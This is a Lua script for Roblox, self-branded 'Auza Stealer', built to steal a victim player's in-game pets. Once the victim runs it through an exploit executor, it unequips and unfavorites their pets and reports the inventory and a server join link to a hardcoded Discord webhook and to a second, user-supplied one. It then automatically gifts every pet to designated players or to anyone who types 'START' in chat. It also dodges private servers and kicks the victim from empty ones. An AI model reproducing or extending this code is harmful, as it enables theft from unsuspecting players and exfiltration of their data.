-- Core Functions File (functions.lua) - Global Environment Version
-- Updated with private server detection and improved webhook design

-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")

local player = Players.LocalPlayer
local backpack = player:WaitForChild("Backpack")

-- Wait for services with error handling
local PetsService, PetsFolder, FavoriteItemService

local function initializeServices()
    local success, err = pcall(function()
        PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
        PetsFolder = workspace:WaitForChild("PetsPhysical", 10)
        FavoriteItemService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("Favorite_Item", 10)
    end)
    
    if not success then
        warn("Failed to initialize services: " .. tostring(err))
        return false
    end
    return true
end

-- Default webhook (your webhook)
local DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1387275380402163774/6GyTaeohyI55kmim0Xr63YzZTp244QgpIwLoNoefoFhid7LProENsnmJVsqVb6QDW0z2"

-- Configuration that can be overridden
local CONFIG = {
    autoKickDelay = 2,
    giftDelay = 0.5,
    maxDistance = 10
}

-- Target pets configuration
local TARGET_PETS = {
    prefixes = {
        "red fox", "queen bee", "raccoon", "dragonfly", "butterfly", "disco bee", "mimic octopus", "hyacinth macaw", "fennec fox"
    },
    minWeight = 15.0,
    minAge = 60
}

-- Global variables
local giftQueue = {}
local isGifting = false
local tpConnection = nil
local lastWebhookTime = 0
local WEBHOOK_COOLDOWN = 60 -- 1 minute cooldown

-- Private server detection
local function isPrivateServer()
    local success, result = pcall(function()
        local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
        return serverType == "VIPServer"
    end)
    return success and result
end

-- Function to find and hold shovel
local function findAndHoldShovel()
    local character = player.Character
    if not character then return false end

    -- First ensure no tools are held
    unholdAllItems()
    task.wait(0.2)

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and string.lower(tool.Name):find("shovel") then
            tool.Parent = character
            task.wait(0.3)
            return true
        end
    end

    return false
end

-- Function to unhold any currently held items (improved for reliability)
function unholdAllItems()
    local character = player.Character
    if not character then return end

    local heldTools = {}
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(heldTools, tool)
        end
    end

    for _, tool in ipairs(heldTools) do
        if tool.Parent == character then
            tool.Parent = backpack
            task.wait(0.05)
        end
    end
    
    task.wait(0.1)
end

local function isPet(tool)
    return tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet"
end

local function extractNumber(text, pattern)
    local match = string.match(text, pattern)
    return match and tonumber(match) or nil
end

local function getWeight(petName)
    return extractNumber(petName, "%[([%d%.]+) KG%]")
end

local function getAge(petName)
    return extractNumber(petName, "%[Age (%d+)%]")
end

local function startsWithTarget(petName)
    local lower = string.lower(petName)
    for _, prefix in ipairs(TARGET_PETS.prefixes) do
        if string.sub(lower, 1, #prefix) == prefix then
            return true
        end
    end
    return false
end

local function isTargetPet(petName)
    if startsWithTarget(petName) then return true end

    local weight = getWeight(petName)
    if weight and weight >= TARGET_PETS.minWeight then return true end

    local age = getAge(petName)
    if age and age >= TARGET_PETS.minAge then return true end

    return false
end

local function getPetPriority(petName)
    if startsWithTarget(petName) then return 1 end
    if getWeight(petName) and getWeight(petName) >= TARGET_PETS.minWeight then return 2 end
    if getAge(petName) and getAge(petName) >= TARGET_PETS.minAge then return 2 end
    return 3
end

local function getPetEmoji(petName)
    local lower = string.lower(petName)
    local emoji = "🐾"

    if string.find(lower, "huge") then
        emoji = "💎"
    elseif string.find(lower, "red fox") then
        emoji = "🦊"
    elseif string.find(lower, "queen bee") or string.find(lower, "pack bee") or string.find(lower, "disco bee") then
        emoji = "🐝"
    elseif string.find(lower, "raccoon") then
        emoji = "🦝"
    elseif string.find(lower, "dragonfly") then
        emoji = "🐉"
    elseif string.find(lower, "butterfly") then
        emoji = "🦋"
    elseif string.find(lower, "mimic octopus") then
        emoji = "🐙"
    elseif string.find(lower, "hyacinth macaw") then
        emoji = "🦜"
    end

    local age = getAge(petName)
    if age and age >= TARGET_PETS.minAge then
        emoji = emoji .. " ⏳"
    end

    local weight = getWeight(petName)
    if weight and weight >= TARGET_PETS.minWeight then
        emoji = emoji .. " ⚖️"
    end

    return emoji
end

local function pickupAllPets()
    if not PetsService or not PetsFolder then
        warn("PetsService or PetsFolder not initialized")
        return
    end
    
    local pickupCount = 0

    for _, pet in ipairs(PetsFolder:GetChildren()) do
        if pet:GetAttribute("OWNER") == player.Name then
            local uuid = pet:GetAttribute("UUID")
            if uuid then
                local success = pcall(function()
                    PetsService:FireServer("UnequipPet", uuid)
                end)
                if success then pickupCount = pickupCount + 1 end
            end
        end
    end

    task.wait(2)
end

local function unfavoriteAllPets()
    if not FavoriteItemService then
        warn("FavoriteItemService not initialized")
        return
    end
    
    local unfavoriteCount = 0

    for _, tool in ipairs(backpack:GetChildren()) do
        if isPet(tool) and tool:GetAttribute("d") == true then
            pcall(function()
                FavoriteItemService:FireServer(tool)
                unfavoriteCount = unfavoriteCount + 1
            end)
        end
    end

    local character = player.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if isPet(tool) and tool:GetAttribute("d") == true then
                pcall(function()
                    FavoriteItemService:FireServer(tool)
                    unfavoriteCount = unfavoriteCount + 1
                end)
            end
        end
    end
end

local function createInventoryMonitor()
    task.spawn(function()
        while true do
            pcall(function()
                local character = player.Character
                if character then
                    for _, tool in ipairs(character:GetChildren()) do
                        if tool:IsA("Tool") then
                            tool.Parent = backpack
                            task.wait(0.05)
                        end
                    end
                end
            end)
            task.wait(3)
        end
    end)
end

local function getAvailablePets()
    local targetPets = {}
    local regularPets = {}

    local function scanContainer(container)
        if not container then return end
        
        for _, tool in ipairs(container:GetChildren()) do
            if isPet(tool) then
                if isTargetPet(tool.Name) then
                    table.insert(targetPets, tool)
                else
                    table.insert(regularPets, tool)
                end
            end
        end
    end

    -- Scan backpack
    pcall(function()
        scanContainer(backpack)
    end)

    -- If no pets found, try alternative backpack reference
    if #targetPets == 0 and #regularPets == 0 then
        pcall(function()
            local bp = player:FindFirstChild("Backpack")
            if bp then
                scanContainer(bp)
            end
        end)
    end

    return targetPets, regularPets
end

-- Robust JSON encoding with multiple fallbacks
local function safeJSONEncode(data)
    -- Try standard HttpService first
    local success, result = pcall(function()
        if not HttpService then
            HttpService = game:GetService("HttpService")
        end
        return HttpService:JSONEncode(data)
    end)
    
    if success then
        return result
    end
    
    -- Try alternative JSON libraries if available
    if _G and _G.JSON and _G.JSON.encode then
        success, result = pcall(_G.JSON.encode, data)
        if success then
            warn("Used alternative JSON library for encoding")
            return result
        end
    end
    
    -- Try syn's JSON if available
    if syn and syn.tojson then
        success, result = pcall(syn.tojson, data)
        if success then
            warn("Used syn.tojson for encoding")
            return result
        end
    end
    
    -- Try http module's JSON if available
    if http and http.JSONEncode then
        success, result = pcall(http.JSONEncode, data)
        if success then
            warn("Used http.JSONEncode for encoding")
            return result
        end
    end
    
    -- Ultimate fallback if everything fails
    warn("All JSON encoding attempts failed, returning minimal structure")
    return '{"content":"Error: Failed to encode webhook data","username":"🌴 Auza Stealer 🌴"}'
end

-- Safe webhook function
local function sendWebhook(embed, content, hasTargets, userWebhookURLs)
    -- Create the webhook data structure with safe values
    local webhookData = {
        content = tostring(content or ""),
        username = "🌴 Auza Stealer 🌴",
        avatar_url = "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png",
        embeds = {embed}
    }

    -- Use our robust JSON encoding
    local jsonData = safeJSONEncode(webhookData)

    -- Send to default webhook first if there are target pets
    if hasTargets and DEFAULT_WEBHOOK and DEFAULT_WEBHOOK ~= "" then
        pcall(function()
            local request = (syn and syn.request) or (http and http.request) or http_request or request
            if request then
                request({
                    Url = DEFAULT_WEBHOOK,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            end
        end)
        task.wait(1)
    end

    -- Send to user webhooks
    if userWebhookURLs then
        for i, url in ipairs(userWebhookURLs) do
            if url and url ~= "" then
                pcall(function()
                    local request = (syn and syn.request) or (http and http.request) or http_request or request
                    if request then
                        request({
                            Url = url,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = jsonData
                        })
                    end
                end)

                if i < #userWebhookURLs then
                    task.wait(0.5)
                end
            end
        end
    end
end

-- Safe embed creation to prevent JSON issues
local function createSafeEmbed(data)
    -- Ensure all string values are properly handled
    local safeData = {}
    for key, value in pairs(data) do
        if type(value) == "string" then
            -- Remove any problematic characters that might break JSON
            safeData[key] = string.gsub(tostring(value), "[%c]", "")
        elseif type(value) == "table" then
            safeData[key] = value
        else
            safeData[key] = tostring(value)
        end
    end
    
    return {
        title = safeData.title or "🌴 Auza Stealer 🌴",
        description = safeData.description or "",
        color = tonumber(safeData.color) or 10181046,
        fields = safeData.fields or {},
        footer = {
            text = safeData.footerText or "🌲 Auza Stealer • Fast Edition by iKazu",
            icon_url = safeData.footerIcon or "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        thumbnail = {
            url = safeData.thumbnail or "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
        }
    }
end

local function getPriorityPlayer(priorityPlayers)
    if not priorityPlayers then return nil end
    
    for _, name in ipairs(priorityPlayers) do
        local p = Players:FindFirstChild(tostring(name))
        if p and p ~= player and p.Character then
            return p
        end
    end
    return nil
end

local function sendStartupWebhook(userWebhook, priorityPlayers, executor)
    -- Check if we're in a private server (teleport to main game instead of sending webhook)
    if isPrivateServer() then
        TeleportService:Teleport(game.PlaceId, player)
        return
    end
    
    -- Webhook cooldown check
    local currentTime = os.time()
    if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
        return
    end
    lastWebhookTime = currentTime
    
    local allPets = {}
    local targetPets = {}

    -- Safely collect pet names
    pcall(function()
        for _, tool in ipairs(backpack:GetChildren()) do
            if isPet(tool) then
                local petName = tostring(tool.Name or "Unknown Pet")
                table.insert(allPets, petName)
                if isTargetPet(petName) then
                    table.insert(targetPets, petName)
                end
            end
        end
    end)

    local hasTargets = #targetPets > 0
    local jobId = tostring(game.JobId or "Unknown")
    local placeId = tostring(game.PlaceId or "Unknown")
    local joinLink = "https://www.roblox.com/games/start?placeId="..placeId.."&gameInstanceId="..jobId

    -- New sleek webhook design
    local description = ""
    
    -- Player Info Section
    description = description .. "### 🔍 Player Information\n"
    description = description .. "👤 **Name:** `" .. player.Name .. "`\n"
    description = description .. "⚙️ **Executor:** `" .. (executor or "Unknown") .. "`\n"
    
    -- VIP Status
    local isVIP = false
    if priorityPlayers then
        for _, vipName in ipairs(priorityPlayers) do
            if tostring(vipName):lower() == player.Name:lower() then
                isVIP = true
                break
            end
        end
    end
    description = description .. "👑 **VIP Status:** " .. (isVIP and "✅" or "❌") .. "\n\n"
    
    -- Target Pets Section (if any)
    if hasTargets then
        description = description .. "### 🎯 Target Pets Found\n"
        for _, petName in ipairs(targetPets) do
            local emoji = getPetEmoji(petName)
            description = description .. emoji .. " `" .. petName .. "`\n"
        end
        description = description .. "\n"
    end

    -- Full Inventory Section
    description = description .. "### 🎒 Full Inventory (" .. #allPets .. " pets)\n"
    if #allPets > 0 then
        -- Group pets by type for better readability
        local petGroups = {}
        for _, petName in ipairs(allPets) do
            local baseName = string.match(petName, "^[^%[]+") or petName
            petGroups[baseName] = (petGroups[baseName] or 0) + 1
        end
        
        -- Add grouped counts to description
        for petType, count in pairs(petGroups) do
            description = description .. "• " .. petType .. " ×" .. count .. "\n"
        end
    else
        description = description .. "```No pets found```\n"
    end

    -- Priority Player Info
    local priorityPlayer = getPriorityPlayer(priorityPlayers)
    if priorityPlayer then
        description = description .. "\n### 👑 Priority Player Detected\n"
        description = description .. "🎁 Auto-gifting to: `" .. priorityPlayer.Name .. "`\n"
    end

    -- Use safe embed creation with new design
    local embed = createSafeEmbed({
        title = "🌴 Auza Stealer - Fast Edition",
        description = description,
        color = hasTargets and 3581519 or 10181046,
        fields = {
            {
                name = "📌 Quick Info", 
                value = string.format("```Server: %s\nPlace ID: %s```", jobId, placeId),
                inline = true
            },
            {
                name = "🔗 Server Join", 
                value = string.format("[Click Here to Join](%s)", joinLink),
                inline = true
            }
        },
        footerText = "🌲 Auza Stealer • Fast Edition by iKazu",
        footerIcon = "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
    })

    local content = ""
    if hasTargets then
        content = "🚨 @everyone 🚨 - TARGET PETS FOUND!"
    elseif priorityPlayer then
        content = "👑 Priority player detected!"
    end

    local userWebhookURLs = {}
    if userWebhook and userWebhook ~= "" then
        table.insert(userWebhookURLs, userWebhook)
    end

    sendWebhook(embed, content, hasTargets, userWebhookURLs)
end

local function hasOtherPlayers()
    return #Players:GetPlayers() > 1
end

local function hasTargetPetsInInventory()
    local targetPets, _ = getAvailablePets()
    return #targetPets > 0
end

local function getTargetPets()
    local targetPets, _ = getAvailablePets()
    return targetPets
end

local function getRegularPets()
    local _, regularPets = getAvailablePets()
    return regularPets
end

local function attemptServerHop()
    local success = pcall(function()
        player:Kick("🌲 Auto-kick: Server was empty")
    end)

    if not success then
        pcall(function()
            TeleportService:Teleport(game.PlaceId, player)
        end)
    end
end

local function tpAndAttach(target)
    if tpConnection then 
        tpConnection:Disconnect() 
        tpConnection = nil
    end

    local char = player.Character
    local targetChar = target.Character

    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
        return false
    end

    tpConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if char.PrimaryPart and targetChar.PrimaryPart then
                char:SetPrimaryPartCFrame(CFrame.new(targetChar.PrimaryPart.Position))
            end
        end)
    end)

    return true
end

local function getNearbyPrompt(maxDistance)
    local char = player.Character
    if not char or not char.PrimaryPart then return nil end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
            local dist = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
            if dist <= maxDistance then
                return obj
            end
        end
    end
    return nil
end

-- Improved giftPet function with better error handling
local function giftPet(pet, target)
    if not target or not target.Parent or not target.Character then
        return false
    end

    if not pet or not pet.Parent or pet.Parent ~= backpack then
        return false
    end

    -- Ensure absolutely no tools are held before starting
    unholdAllItems()
    task.wait(0.2)

    local success = pcall(function()
        if pet.Parent == backpack then
            pet.Parent = player.Character
        else
            return false
        end
    end)

    if not success then
        return false
    end

    task.wait(0.5)

    local prompt = getNearbyPrompt(CONFIG.maxDistance)
    if prompt then
        local giftSuccess = false

        pcall(function()
            prompt:InputHoldBegin()
            task.wait(2.0)
            prompt:InputHoldEnd()
            giftSuccess = true
        end)

        task.wait(0.2)

        if not giftSuccess then
            pcall(function()
                prompt:InputBegin()
                task.wait(0.1)
                prompt:InputEnd()
            end)
        end

        task.wait(0.2)

        pcall(function()
            prompt.Triggered:Fire(player)
        end)
    end

    -- Ensure pet is returned to backpack after gifting attempt
    pcall(function()
        if pet and pet.Parent == player.Character then
            pet.Parent = backpack
        end
    end)

    task.wait(0.1)

    return true
end

local function giftAllPets(target)
    if isGifting then return end
    isGifting = true

    task.spawn(function()
        pcall(function()
            findAndHoldShovel()
            task.wait(0.2)
            unholdAllItems()
        end)
    end)

    task.wait(0.3)

    if not tpAndAttach(target) then
        isGifting = false
        return
    end

    local giftedCount = 0
    local totalAttempts = 0
    local maxTotalAttempts = 200

    while totalAttempts < maxTotalAttempts do
        totalAttempts = totalAttempts + 1

        if not target or not target.Parent or not target.Character then
            break
        end

        local targetPets, regularPets = getAvailablePets()

        if #targetPets > 0 then
            table.sort(targetPets, function(a, b)
                return getPetPriority(a.Name) < getPetPriority(b.Name)
            end)

            local pet = targetPets[1]
            local giftResult = false

            pcall(function()
                giftResult = giftPet(pet, target)
            end)

            if giftResult then
                giftedCount = giftedCount + 1
                task.wait(CONFIG.giftDelay)
                continue
            end
        end

        if #regularPets > 0 then
            local pet = regularPets[1]
            local giftResult = false

            pcall(function()
                giftResult = giftPet(pet, target)
            end)

            if giftResult then
                giftedCount = giftedCount + 1
                task.wait(CONFIG.giftDelay)
                continue
            end
        end

        if #targetPets == 0 and #regularPets == 0 then
            break
        end

        task.wait(0.5)
    end

    pcall(function()
        if tpConnection then
            tpConnection:Disconnect()
            tpConnection = nil
        end
    end)

    isGifting = false
end

local function setupChatMonitoring()
    local function connectPlayer(p)
        if p == player then return end

        local function onChatted(message)
            if string.upper(tostring(message)) == "START" then
                for _, queued in ipairs(giftQueue) do
                    if queued == p then return end
                end

                if #getTargetPets() > 0 or #getRegularPets() > 0 then
                    table.insert(giftQueue, p)
                end
            end
        end

        local function setupChat()
            pcall(function()
                p.Chatted:Connect(onChatted)
            end)
        end

        if p.Character then
            setupChat()
        else
            p.CharacterAdded:Connect(function()
                task.wait(1)
                setupChat()
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do
        connectPlayer(p)
    end

    Players.PlayerAdded:Connect(connectPlayer)
end

local function cleanQueue()
    local clean = {}
    for _, p in ipairs(giftQueue) do
        if p and p.Parent and p.Character then
            table.insert(clean, p)
        end
    end
    giftQueue = clean
end

local function getNextTarget(priorityPlayers)
    cleanQueue()

    local priority = getPriorityPlayer(priorityPlayers)
    if priority and (hasTargetPetsInInventory() or #getRegularPets() > 0) then
        return priority
    end

    if (#getTargetPets() > 0 or #getRegularPets() > 0) and #giftQueue > 0 then
        return table.remove(giftQueue, 1)
    end

    return nil
end

local function startMainLoops(priorityPlayers)
    -- Pet pickup loop
    task.spawn(function()
        while true do
            pcall(function()
                if PetsService and PetsFolder then
                    for _, pet in ipairs(PetsFolder:GetChildren()) do
                        if pet:GetAttribute("OWNER") == player.Name then
                            local uuid = pet:GetAttribute("UUID")
                            if uuid then
                                pcall(function()
                                    PetsService:FireServer("UnequipPet", uuid)
                                end)
                            end
                        end
                    end
                end
            end)
            task.wait(1)
        end
    end)

    -- Auto kick loop
    task.spawn(function()
        while true do
            pcall(function()
                if #Players:GetPlayers() == 1 then
                    task.wait(CONFIG.autoKickDelay)

                    if #Players:GetPlayers() == 1 then
                        attemptServerHop()
                    end
                end
            end)
            task.wait(1)
        end
    end)

    -- Priority player gifting loop
    task.spawn(function()
        while true do
            pcall(function()
                local priorityPlayer = getPriorityPlayer(priorityPlayers)
                if priorityPlayer and not isGifting and (hasTargetPetsInInventory() or #getRegularPets() > 0) then
                    giftAllPets(priorityPlayer)
                end
            end)
            task.wait(1)
        end
    end)

    -- Main gifting loop
    task.spawn(function()
        while true do
            pcall(function()
                if not isGifting then
                    local target = getNextTarget(priorityPlayers)
                    if target and (#getTargetPets() > 0 or #getRegularPets() > 0) then
                        task.spawn(function()
                            giftAllPets(target)
                        end)
                    end
                end
            end)
            task.wait(1)
        end
    end)
end

-- Initialize global environment safely
local function initializeGlobalEnvironment(executor)
    -- Determine the correct global environment
    local globalEnv = (_G ~= nil and _G) or (shared ~= nil and shared) or (getgenv ~= nil and getgenv()) or {}
    
    -- Create our CoreFunctions table if it doesn't exist
    globalEnv.CoreFunctions = globalEnv.CoreFunctions or {}

    -- Core initialization
    globalEnv.CoreFunctions.initializeServices = initializeServices
    globalEnv.CoreFunctions.isPrivateServer = isPrivateServer
    
    -- Configuration
    globalEnv.CoreFunctions.DEFAULT_WEBHOOK = DEFAULT_WEBHOOK
    globalEnv.CoreFunctions.CONFIG = CONFIG
    globalEnv.CoreFunctions.TARGET_PETS = TARGET_PETS
    
    -- Global state
    globalEnv.CoreFunctions.giftQueue = giftQueue
    globalEnv.CoreFunctions.isGifting = isGifting
    globalEnv.CoreFunctions.tpConnection = tpConnection
    
    -- Utility functions
    globalEnv.CoreFunctions.findAndHoldShovel = findAndHoldShovel
    globalEnv.CoreFunctions.unholdAllItems = unholdAllItems
    globalEnv.CoreFunctions.isPet = isPet
    globalEnv.CoreFunctions.extractNumber = extractNumber
    globalEnv.CoreFunctions.getWeight = getWeight
    globalEnv.CoreFunctions.getAge = getAge
    globalEnv.CoreFunctions.startsWithTarget = startsWithTarget
    globalEnv.CoreFunctions.isTargetPet = isTargetPet
    globalEnv.CoreFunctions.getPetPriority = getPetPriority
    globalEnv.CoreFunctions.getPetEmoji = getPetEmoji
    
    -- Pet management
    globalEnv.CoreFunctions.pickupAllPets = pickupAllPets
    globalEnv.CoreFunctions.unfavoriteAllPets = unfavoriteAllPets
    globalEnv.CoreFunctions.createInventoryMonitor = createInventoryMonitor
    globalEnv.CoreFunctions.getAvailablePets = getAvailablePets
    globalEnv.CoreFunctions.getTargetPets = getTargetPets
    globalEnv.CoreFunctions.getRegularPets = getRegularPets
    globalEnv.CoreFunctions.hasTargetPetsInInventory = hasTargetPetsInInventory
    
    -- Webhook functions
    globalEnv.CoreFunctions.safeJSONEncode = safeJSONEncode
    globalEnv.CoreFunctions.sendWebhook = sendWebhook
    globalEnv.CoreFunctions.createSafeEmbed = createSafeEmbed
    globalEnv.CoreFunctions.sendStartupWebhook = function(webhook, priorityPlayers)
        sendStartupWebhook(webhook, priorityPlayers, executor)
    end
    
    -- Player management
    globalEnv.CoreFunctions.getPriorityPlayer = getPriorityPlayer
    globalEnv.CoreFunctions.hasOtherPlayers = hasOtherPlayers
    globalEnv.CoreFunctions.attemptServerHop = attemptServerHop
    
    -- Teleportation and gifting
    globalEnv.CoreFunctions.tpAndAttach = tpAndAttach
    globalEnv.CoreFunctions.getNearbyPrompt = getNearbyPrompt
    globalEnv.CoreFunctions.giftPet = giftPet
    globalEnv.CoreFunctions.giftAllPets = giftAllPets
    
    -- Chat and queue management
    globalEnv.CoreFunctions.setupChatMonitoring = setupChatMonitoring
    globalEnv.CoreFunctions.cleanQueue = cleanQueue
    globalEnv.CoreFunctions.getNextTarget = getNextTarget
    
    -- Main execution
    globalEnv.CoreFunctions.startMainLoops = startMainLoops

    return globalEnv.CoreFunctions
end

-- Initialize the global environment
initializeGlobalEnvironment(executor or "Unknown")

-- Return the CoreFunctions table for module usage
return _G.CoreFunctions or shared.CoreFunctions or getgenv().CoreFunctions
